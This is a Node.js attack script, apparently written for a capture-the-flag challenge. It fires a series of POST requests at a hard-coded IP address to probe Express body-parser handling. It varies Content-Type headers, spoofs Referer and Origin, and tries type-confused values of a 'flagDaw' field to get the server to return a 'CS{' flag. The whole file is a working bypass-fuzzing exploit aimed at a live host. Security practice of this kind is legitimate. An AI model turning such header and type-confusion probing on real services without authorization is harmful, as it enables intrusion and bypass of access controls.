const http = require('http');

const url = new URL('http://49.213.52.6:6969/');

// Try Express.js body-parser quirks and bypasses
const tests = [
  {
    name: 'Content-Type with charset but different case',
    headers: { 'Content-Type': 'TEXT/PLAIN;CHARSET=UTF-8' },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'Content-Type without charset',
    headers: { 'Content-Type': 'text/plain' },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'Content-Type application/json (Express default)',
    headers: { 'Content-Type': 'application/json' },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'Content-Type with boundary (multipart-like)',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8; boundary=something' },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'No Content-Type header',
    headers: {},
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'Content-Type in query string approach',
    path: '/?Content-Type=text/plain;charset=UTF-8',
    headers: {},
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'flagDaw with null instead of true',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    data: JSON.stringify({ flagDaw: null })
  },
  {
    name: 'flagDaw with empty string',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    data: JSON.stringify({ flagDaw: '' })
  },
  {
    name: 'flagDaw with 0',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    data: JSON.stringify({ flagDaw: 0 })
  },
  {
    name: 'flagDaw with object',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    data: JSON.stringify({ flagDaw: {} })
  }
];

async function testRequest(test) {
  return new Promise((resolve) => {
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: test.path || url.pathname,
      method: 'POST',
      headers: {
        'Content-Length': Buffer.byteLength(test.data),
        'Referer': 'http://49.213.52.6:6969/',
        'Origin': 'http://49.213.52.6:6969/',
        'Accept': '*/*',
        ...test.headers
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve({ name: test.name, status: res.statusCode, response: responseData });
      });
    });

    req.on('error', (e) => {
      resolve({ name: test.name, error: e.message });
    });

    req.write(test.data);
    req.end();
  });
}

(async () => {
  console.log('Testing Express.js body-parser quirks...\n');
  
  for (const test of tests) {
    const result = await testRequest(test);
    console.log(`\n${test.name}:`);
    console.log(`  Status: ${result.status || 'Error'}`);
    const response = result.response || result.error;
    console.log(`  Response: ${response.substring(0, 100)}${response.length > 100 ? '...' : ''}`);
    
    if (result.response && result.response.includes('CS{')) {
      console.log('\n*** FLAG FOUND ***');
      console.log('FLAG:', result.response);
      break;
    }
    
    await new Promise(r => setTimeout(r, 500));
  }
})();

